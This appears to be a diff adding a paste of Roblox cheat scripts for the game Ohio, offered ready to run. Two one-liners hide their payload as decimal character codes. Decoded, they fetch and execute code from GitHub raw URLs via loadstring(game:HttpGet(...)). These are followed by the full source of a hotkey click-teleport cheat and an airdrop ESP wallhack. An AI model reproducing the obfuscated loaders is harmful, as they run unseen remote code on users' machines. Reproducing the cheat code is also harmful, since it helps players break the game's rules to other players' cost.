@@ -1,0 +1,182 @@
+OHIO SCRIPT 
+
+aim lock plus printer esp , est , tracers fly (link):
+
+loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,85,83,67,82,73,80,84,83,47,79,72,73,79,86,70,85,67,75,73,78,51,47,109,97,105,110,47,70,85,67,75,79,72,73,79,80,85,34,41,41,40,41}) end)()))()
+
+
+chinees script working on pc (link):
+
+loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
+
+
+universal H click tp (source):
+
+--Makes sure this script is only executed once
+if _G.WRDClickTeleport == nil then
+    _G.WRDClickTeleport = true
+
+    local player = game:GetService("Players").LocalPlayer
+    local UserInputService = game:GetService("UserInputService")
+    local mouse = player:GetMouse()
+
+    --Waits until the player's mouse is found
+    repeat wait() until mouse
+
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            -- Only click teleport if the toggle is enabled and "H" is pressed
+            if _G.WRDClickTeleport and UserInputService:IsKeyDown(Enum.KeyCode.H) then
+                player.Character:MoveTo(Vector3.new(mouse.Hit.x, mouse.Hit.y, mouse.Hit.z)) 
+            end
+        end
+    end)
+
+--Just toggle instead of re-executing the script
+else
+    _G.WRDClickTeleport = not _G.WRDClickTeleport
+    --Notify
+    if _G.WRDClickTeleport then
+        game.StarterGui:SetCore("SendNotification", {Title="WeAreDevs.net"; Text="Click teleport enabled"; Duration=5;})
+    else
+        game.StarterGui:SetCore("SendNotification", {Title="WeAreDevs.net"; Text="Click teleport disabled"; Duration=5;})
+    end
+end
+
+
+airdrop esp script (source):
+
+-- Services and Variable Declarations
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local Camera = Workspace.CurrentCamera
+
+-- Table to keep track of ESPs
+local espTable = {}
+
+-- Helper function to create and update the ESP box and text
+local function createESP(item, text)
+    -- Drawing objects for the box
+    local boxESP = {
+        topBorder = Drawing.new("Line"),
+        bottomBorder = Drawing.new("Line"),
+        leftBorder = Drawing.new("Line"),
+        rightBorder = Drawing.new("Line"),
+        textLabel = Drawing.new("Text")
+    }
+
+    -- Configure default properties for box
+    for _, element in pairs(boxESP) do
+        element.Transparency = 1
+        element.Visible = false
+    end
+
+    boxESP.topBorder.Thickness = 2
+    boxESP.bottomBorder.Thickness = 2
+    boxESP.leftBorder.Thickness = 2
+    boxESP.rightBorder.Thickness = 2
+    boxESP.textLabel.Size = 20
+    boxESP.textLabel.Center = true
+    boxESP.textLabel.Outline = true
+    boxESP.textLabel.OutlineThickness = 1
+
+    -- Update function for ESP
+    local function updateESP()
+        if not item.Parent or item.Parent == nil then
+            -- Cleanup drawing objects if item is removed
+            for _, element in pairs(boxESP) do
+                element.Visible = false
+                element:Remove() -- Remove the drawing element
+            end
+            -- Remove this ESP from the table
+            espTable[item] = nil
+            return
+        end
+
+        local screenPosition, onScreen = Camera:WorldToScreenPoint(item.Position)
+        if onScreen then
+            -- Box size and position
+            local boxSize = Vector2.new(100, 50) -- Adjust size as needed
+            local boxPosition = Vector2.new(screenPosition.X, screenPosition.Y + 25) -- Move the box up slightly
+            local textPosition = Vector2.new(screenPosition.X, screenPosition.Y - 60) -- Keep text position as is
+            local halfBoxSize = boxSize / 2
+
+            -- Draw Box Borders
+            boxESP.topBorder.From = boxPosition - Vector2.new(halfBoxSize.X, halfBoxSize.Y)
+            boxESP.topBorder.To = boxPosition + Vector2.new(halfBoxSize.X, -halfBoxSize.Y)
+            boxESP.topBorder.Color = Color3.new(1.000000, 1.000000, 1.000000)
+            boxESP.topBorder.Visible = true
+
+            boxESP.bottomBorder.From = boxPosition - Vector2.new(halfBoxSize.X, -halfBoxSize.Y)
+            boxESP.bottomBorder.To = boxPosition + Vector2.new(halfBoxSize.X, halfBoxSize.Y)
+            boxESP.bottomBorder.Color = Color3.new(1.000000, 1.000000, 1.000000)
+            boxESP.bottomBorder.Visible = true
+
+            boxESP.leftBorder.From = boxPosition - Vector2.new(halfBoxSize.X, halfBoxSize.Y)
+            boxESP.leftBorder.To = boxPosition - Vector2.new(halfBoxSize.X, -halfBoxSize.Y)
+            boxESP.leftBorder.Color = Color3.new(1.000000, 1.000000, 1.000000)
+            boxESP.leftBorder.Visible = true
+
+            boxESP.rightBorder.From = boxPosition + Vector2.new(halfBoxSize.X, -halfBoxSize.Y)
+            boxESP.rightBorder.To = boxPosition + Vector2.new(halfBoxSize.X, halfBoxSize.Y)
+            boxESP.rightBorder.Color = Color3.new(1.000000, 1.000000, 1.000000)
+            boxESP.rightBorder.Visible = true
+
+            -- Draw Text Label
+            boxESP.textLabel.Position = textPosition
+            boxESP.textLabel.Text = text
+            boxESP.textLabel.Color = Color3.new(0.000000, 0.682353, 1.000000)
+            boxESP.textLabel.Visible = true
+        else
+            -- Hide elements if not on screen
+            for _, element in pairs(boxESP) do
+                element.Visible = false
+            end
+        end
+    end
+
+    -- Use Heartbeat to update ESP with less impact on performance
+    local heartbeatConnection
+    heartbeatConnection = RunService.Heartbeat:Connect(function()
+        updateESP()
+        -- Disconnect the connection when no longer needed
+        if not item.Parent or item.Parent == nil then
+            heartbeatConnection:Disconnect()
+        end
+    end)
+
+    -- Add to ESP table
+    espTable[item] = boxESP
+
+    return updateESP
+end
+
+-- Function to apply ESP to the specific item
+local function applyESPToSpecificItem()
+    local specificItem = Workspace:FindFirstChild("Game"):FindFirstChild("Airdrops"):FindFirstChild("Airdrop"):FindFirstChild("Meshes/Airdrop_Plane.002_Plane.002_Material.002 (1)")
+    if specificItem then
+        createESP(specificItem, "Airdrop")
+    else
+        warn("Specific item not found!")
+    end
+end
+
+-- Apply ESP to the specific item initially
+applyESPToSpecificItem()
+
+-- Function to handle new items being added
+local function onNewItemAdded(item)
+    -- Check if the new item is the specific Airdrop
+    if item.Name == "Meshes/Airdrop_Plane.002_Plane.002_Material.002 (1)" then
+        createESP(item, "Airdrop")
+    end
+end
+
+-- Connect the ChildAdded event to apply ESP when new items are added
+local airdropFolder = Workspace:FindFirstChild("Game"):FindFirstChild("Airdrops"):FindFirstChild("Airdrop")
+if airdropFolder then
+    airdropFolder.ChildAdded:Connect(onNewItemAdded)
+else
+    warn("Airdrop folder not found!")
+end
